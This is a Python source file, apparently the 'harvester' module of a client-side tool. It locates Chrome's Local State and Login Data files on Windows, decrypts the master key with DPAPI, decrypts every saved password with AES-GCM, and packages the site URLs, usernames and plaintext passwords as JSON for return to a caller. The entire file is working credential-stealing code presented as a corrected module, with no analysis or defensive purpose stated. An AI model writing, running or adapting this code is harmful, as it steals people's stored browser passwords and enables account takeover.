# client/harvester.py (Corrected)
import os
import json
import base64
import sqlite3
import shutil
import traceback
from datetime import datetime, timedelta

# Windows-specific imports
try:
    import win32crypt
except ImportError:
    win32crypt = None

# NEW, CORRECTED import from the 'cryptography' library
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a Chrome format datetime"""
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception:
            return chromedate
    return ""

def get_encryption_key():
    """Gets the master encryption key from the Chrome 'Local State' file."""
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "Local State")
    if not os.path.exists(local_state_path):
        raise FileNotFoundError("Chrome 'Local State' file not found.")
    
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    """Decrypts a Chrome password using the master key."""
    try:
        # Get the initialization vector (IV) and the encrypted password
        iv = password[3:15]
        encrypted_password = password[15:]
        
        # Create a cipher using the new library
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
        decryptor = cipher.decryptor()
        
        # Decrypt and return
        decrypted_pass = decryptor.update(encrypted_password) + decryptor.finalize()
        return decrypted_pass.decode()
    except Exception:
        try:
            # Fallback for older Chrome versions that used DPAPI directly
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except Exception:
            return "Decryption Failed"

def harvest_chrome_passwords():
    """Main function to harvest passwords from Chrome."""
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    if not os.path.exists(db_path):
        raise FileNotFoundError("Chrome 'Login Data' database not found.")
        
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    
    found_credentials = []
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    for row in cursor.fetchall():
        origin_url, action_url, username, password, date_created, date_last_used = row
        if username or password:
            decrypted_password = decrypt_password(password, key)
            found_credentials.append({
                "origin_url": origin_url,
                "action_url": action_url,
                "username": username,
                "password": decrypted_password,
                "date_created": str(get_chrome_datetime(date_created)),
                "last_used": str(get_chrome_datetime(date_last_used))
            })
            
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except Exception as e:
        print(f"Error removing temp db file: {e}")

    return {"chrome_passwords": found_credentials}

def run_harvester():
    """Runs all harvester modules and returns a single JSON object."""
    try:
        if os.name != 'nt' or not win32crypt:
            return json.dumps({"error": "Harvester module is only supported on Windows."})
        
        results = {}
        results.update(harvest_chrome_passwords())
        return json.dumps(results, indent=4)

    except Exception:
        error_message = traceback.format_exc()
        return json.dumps({"error": "An exception occurred in the harvester module.", "details": error_message}, indent=4)